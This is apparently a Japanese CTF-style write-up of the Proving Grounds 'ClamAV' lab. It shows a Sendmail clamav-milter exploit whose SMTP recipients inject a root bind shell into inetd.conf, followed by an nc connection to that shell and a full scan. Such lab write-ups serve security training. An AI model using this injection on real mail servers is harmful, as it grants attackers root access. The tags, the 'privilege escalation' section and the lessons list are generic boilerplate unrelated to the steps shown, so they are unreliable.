@@ -1,0 +1,336 @@
+---
+title: "Proving Grounds - ClamAV 解説 (Linux)"
+date: 2026-02-25
+description: "Proving Grounds ClamAV Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
+categories: [Proving Grounds, Linux]
+tags: [rce, suid, php, privilege-escalation]
+mermaid: true
+content_lang: ja
+alt_en: /posts/pg-clamav/
+---
+
+## 概要
+
+| 項目 | 内容 |
+|---------------------------|-------|
+| OS | Linux |
+| 難易度 | 記録なし |
+| 攻撃対象 | Web application and exposed network services |
+| 主な侵入経路 | Web RCE (CVE-2007-4560) |
+| 権限昇格経路 | Local enumeration -> misconfiguration abuse -> root |
+
+## 認証情報
+
+認証情報なし。
+
+## 偵察
+
+---
+💡 なぜ有効か  
+This stage maps the reachable attack surface and identifies where exploitation is most likely to succeed. Accurate service and content discovery reduces blind testing and drives targeted follow-up actions.
+
+## 初期足がかり
+
+---
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+```bash
+searchsploit sendmail
+```
+
+```bash
+✅[20:05][CPU:2][MEM:57][TUN0:192.168.45.193][/home/n0z0]
+🐉 > searchsploit sendmail     
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                  |  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                                                                                                                 | multiple/remote/4761.pl
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+```
+
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+```bash
+nmap -p 31337 $ip
+```
+
+```bash
+❌[20:13][CPU:15][MEM:62][TUN0:192.168.45.193][/home/n0z0]
+🐉 > nmap -p 31337 $ip                               
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 20:22 JST
+Nmap scan report for 192.168.245.42
+Host is up (0.085s latency).
+
+PORT      STATE  SERVICE
+31337/tcp closed Elite
+
+Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
+
+```
+
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+```bash
+perl 4761.pl $ip
+```
+
+```bash
+✅[20:22][CPU:2][MEM:61][TUN0:192.168.45.193][...SCP/Proving_Ground/ClamAV]
+🐉 > perl 4761.pl $ip
+Sendmail w/ clamav-milter Remote Root Exploit
+Copyright (C) 2007 Eliteboy
+Attacking 192.168.245.42...
+220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Wed, 31 Dec 2025 11:22:56 -0500; (No UCE/UBE) logging access from: [192.168.45.193](FAIL)-[192.168.45.193]
+250-localhost.localdomain Hello [192.168.45.193], pleased to meet you
+250-ENHANCEDSTATUSCODES
+250-PIPELINING
+250-EXPN
+250-VERB
+250-8BITMIME
+250-SIZE
+250-DSN
+250-ETRN
+250-DELIVERBY
+250 HELP
+250 2.1.0 <>... Sender ok
+250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
+250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
+354 Enter mail, end with "." on a line by itself
+250 2.0.0 5BVGMutH003996 Message accepted for delivery
+221 2.0.0 localhost.localdomain closing connection
+
+```
+
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+```bash
+nmap -p 31337 $ip
+```
+
+```bash
+✅[20:22][CPU:4][MEM:61][TUN0:192.168.45.193][/home/n0z0]
+🐉 > nmap -p 31337 $ip
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 20:23 JST
+Nmap scan report for 192.168.245.42
+Host is up (0.19s latency).
+
+PORT      STATE    SERVICE
+31337/tcp filtered Elite
+
+Nmap done: 1 IP address (1 host up) scanned in 2.26 seconds
+
+```
+
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+```bash
+nc -vn 192.168.245.42 31337
+ls -la
+```
+
+```bash
+✅[20:22][CPU:2][MEM:61][TUN0:192.168.45.193][...SCP/Proving_Ground/ClamAV]
+🐉 > nc -vn 192.168.245.42 31337            
+(UNKNOWN) [192.168.245.42] 31337 (?) open
+whoami
+root
+bash -i
+bash: no job control in this shell
+root@0xbabe:/# ls -la
+total 144
+```
+
+💡 なぜ有効か  
+The initial access step chains discovered weaknesses into executable control over the target. Successful foothold techniques are validated by command execution or interactive shell callbacks.
+
+## 権限昇格
+
+---
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+```bash
+cat proof.txt
+ip a
+```
+
+```bash
+root@0xbabe:/root# cat proof.txt
+6267ee5a77658aaa616f69776c046981
+root@0xbabe:/root# ip a
+bash: ip: command not found
+
+```
+
+攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。
+
+```bash
+timestamp=$(date +%Y%m%d-%H%M%S)
+```
+
+```bash
+✅[20:23][CPU:5][MEM:60][TUN0:192.168.45.193][/home/n0z0]
+🐉 > timestamp=$(date +%Y%m%d-%H%M%S)     
+output_file="$HOME/work/scans/${timestamp}_${ip}.xml"
+
+grc nmap -p- -sCV -sV -T4 -A -Pn "$ip" -oX "$output_file"
+
+echo -e "\e[32mScan result saved to: $output_file\e[0m"
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-31 20:38 JST
+Warning: 192.168.245.42 giving up on port because retransmission cap hit (6).
+Nmap scan report for 192.168.245.42
+Host is up (0.090s latency).
+Not shown: 65516 closed tcp ports (reset)
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
+25/tcp    open     smtp          Sendmail 8.13.4/8.13.4/Debian-3sarge3
+| smtp-commands: localhost.localdomain Hello [192.168.45.193], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
+|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp    open     http          Apache httpd 1.3.33 ((Debian GNU/Linux))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Ph33r
+|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
+139/tcp   open     netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+199/tcp   open     smux          Linux SNMP multiplexer
+445/tcp   open     netbios-ssn   Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
+2616/tcp  filtered appswitch-emp
+8404/tcp  filtered svcloud
+27606/tcp filtered unknown
+31337/tcp open     Elite?
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     -i: line 1: GET: command not found
+|     line 2: 
+|     command not found
+|   GenericLines: 
+|     -i: line 1: 
+|     command not found
+|     line 2: 
+|     command not found
+|   HTTPOptions, RTSPRequest: 
+|     -i: line 1: OPTIONS: command not found
+|     line 2: 
+|     command not found
+|   Help: 
+|     -i: line 1: HELP
+|     command not found
+|   Kerberos: 
+|     -i: line 1: qj
+|     command not found
+|   LDAPSearchReq: 
+|     -i: line 1: 0
+|     command not found
+|     line 2: 
+|     command not found
+|   LPDString: 
+|     -i: line 1: 
+|     default: command not found
+|   TLSSessionReq: 
+|     -i: line 1: 
+|     random1random2random3random4
+|     such file or directory
+|   TerminalServerCookie: 
+|     -i: line 1: 
+|_    Cookie:: command not found
+33021/tcp filtered unknown
+33685/tcp filtered unknown
+35955/tcp filtered unknown
+37872/tcp filtered unknown
+46373/tcp filtered unknown
+52756/tcp filtered unknown
+58907/tcp filtered unknown
+59107/tcp filtered unknown
+60000/tcp open     ssh           OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port31337-TCP:V=7.95%I=7%D=12/31%Time=69550CE7%P=x86_64-pc-linux-gnu%r(
+SF:GetRequest,44,"-i:\x20line\x201:\x20GET:\x20command\x20not\x20found\n-i
+SF::\x20line\x202:\x20\r:\x20command\x20not\x20found\n")%r(GenericLines,42
+SF:,"-i:\x20line\x201:\x20\r:\x20command\x20not\x20found\n-i:\x20line\x202
+SF::\x20\r:\x20command\x20not\x20found\n")%r(HTTPOptions,48,"-i:\x20line\x
+SF:201:\x20OPTIONS:\x20command\x20not\x20found\n-i:\x20line\x202:\x20\r:\x
+SF:20command\x20not\x20found\n")%r(RTSPRequest,48,"-i:\x20line\x201:\x20OP
+SF:TIONS:\x20command\x20not\x20found\n-i:\x20line\x202:\x20\r:\x20command\
+SF:x20not\x20found\n")%r(Help,25,"-i:\x20line\x201:\x20HELP\r:\x20command\
+SF:x20not\x20found\n")%r(TerminalServerCookie,2B,"-i:\x20line\x201:\x20\x0
+SF:3\*%\xe0Cookie::\x20command\x20not\x20found\n")%r(TLSSessionReq,51,"-i:
+SF:\x20line\x201:\x20\x16\x03i\x01e\x03\x03U\x1c\xa7\xe4random1random2rand
+SF:om3random4\x0c/:\x20No\x20such\x20file\x20or\x20directory\n")%r(Kerbero
+SF:s,30,"-i:\x20line\x201:\x20qj\x81n0\x81k\xa1\x03\x02\x01\x05\xa2\x03\x0
+SF:2\x01:\x20command\x20not\x20found\n")%r(FourOhFourRequest,44,"-i:\x20li
+SF:ne\x201:\x20GET:\x20command\x20not\x20found\n-i:\x20line\x202:\x20\r:\x
+SF:20command\x20not\x20found\n")%r(LPDString,28,"-i:\x20line\x201:\x20\x01
+SF:default:\x20command\x20not\x20found\n")%r(LDAPSearchReq,4B,"-i:\x20line
+SF:\x201:\x200\x84-\x02\x01\x07c\x84\$\x04:\x20command\x20not\x20found\n-i
+SF::\x20line\x202:\x20\x01:\x20command\x20not\x20found\n");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=12/31%OT=22%CT=1%CU=36841%PV=Y%DS=4%DC=T%G=Y%TM=69550D
+OS:9F%P=x86_64-pc-linux-gnu)SEQ(SP=C4%GCD=1%ISR=C9%TI=Z%CI=Z%II=I%TS=A)SEQ(
+OS:SP=C7%GCD=1%ISR=CB%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=C8%GCD=1%ISR=CC%TI=Z%CI=Z%
+OS:II=I%TS=A)SEQ(SP=CC%GCD=1%ISR=CB%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=CC%GCD=1%ISR
+OS:=CC%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M578ST11NW0%O2=M578ST11NW0%O3=M578NNT11NW
+OS:0%O4=M578ST11NW0%O5=M578ST11NW0%O6=M578ST11)WIN(W1=16A0%W2=16A0%W3=16A0%
+OS:W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M578NNSNW0%CC=N%Q=)T1
+OS:(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%
+OS:S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(
+OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164
+OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.14a-Debian)
+|   NetBIOS computer name: 
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2025-12-31T11:48:15-05:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: share (dangerous)
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 7h29m58s, deviation: 3h32m07s, median: 4h59m58s
+|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT      ADDRESS
+1   93.11 ms 192.168.45.1
+2   93.06 ms 192.168.45.254
+3   93.11 ms 192.168.251.1
+4   93.17 ms 192.168.245.42
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 644.31 seconds
+Scan result saved to: /home/n0z0/work/scans/20251231-203803_192.168.245.42.xml
+
+```
+
+💡 なぜ有効か  
+Privilege escalation relies on local misconfigurations, unsafe permissions, and trusted execution paths. Enumerating and abusing these trust boundaries is the fastest route to root-level access.
+
+## まとめ・学んだこと
+
+- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
+- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
+- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
+- 露出した認証情報と環境ファイルを重要機密として扱う。
+
+## 参考文献
+
+- CVE-2007-4560: https://nvd.nist.gov/vuln/detail/CVE-2007-4560
+- RustScan: https://github.com/RustScan/RustScan
+- Nmap: https://nmap.org/
+- feroxbuster: https://github.com/epi052/feroxbuster
+- Nuclei: https://github.com/projectdiscovery/nuclei
+- GTFOBins: https://gtfobins.org/
+- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
